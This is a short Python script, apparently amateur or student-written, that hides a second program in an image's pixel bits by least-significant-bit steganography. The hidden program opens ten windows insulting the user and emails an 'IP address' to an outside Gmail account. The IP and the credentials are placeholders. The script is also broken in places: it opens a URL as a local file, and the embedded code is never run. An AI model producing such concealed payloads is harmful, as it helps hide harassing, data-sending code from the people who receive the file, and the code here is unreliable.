from PIL import Image

# Path to the image file
image_path = "https://codehs.com/uploads/3f1b114d4da9dba94a05f6f0039db173"

# Code snippet to embed
code = '''
import webbrowser
import tkinter as tk

def open_window_prompt():
    window = tk.Tk()
    window.title("Stinky Ding Dong")
    window.geometry("300x200")
    label = tk.Label(window, text="You are a stinky ding dong!")
    label.pack()
    window.mainloop()

# Open 10 window prompts
for _ in range(10):
    open_window_prompt()

# Obtain IP address
ip_address = "Your_IP_Address"

# Send email with IP address
import smtplib

def send_email():
    from_email = "your_email@example.com"
    to_email = "knifymcknifer@gmail.com"
    subject = "IP Address"
    message = f"The IP address is: {ip_address}"

    smtp_obj = smtplib.SMTP("smtp.gmail.com", 587)
    smtp_obj.starttls()
    smtp_obj.login(from_email, "your_password")
    smtp_obj.sendmail(from_email, to_email, f"Subject: {subject}\n\n{message}")
    smtp_obj.quit()

send_email()
'''

# Convert the code to binary
binary_code = ''.join(format(ord(char), '08b') for char in code)

# Embed the binary code into the image
def embed_code(image_path, binary_code):
    image = Image.open(image_path)

    # Check if the image is large enough to hold the code
    if len(binary_code) > image.width * image.height:
        print("Image is too small to embed the code.")
        return

    encoded_pixels = []
    binary_index = 0

    for pixel in image.getdata():
        if binary_index >= len(binary_code):
            encoded_pixels.append(pixel)
            continue

        r, g, b = pixel
        r = (r & 0xFE) | int(binary_code[binary_index])
        binary_index += 1
        encoded_pixels.append((r, g, b))

    encoded_image = Image.new(image.mode, image.size)
    encoded_image.putdata(encoded_pixels)

    encoded_image.save("encoded_image.png")
    print("Code embedded successfully.")

# Embed the code into the image
embed_code(image_path, binary_code)
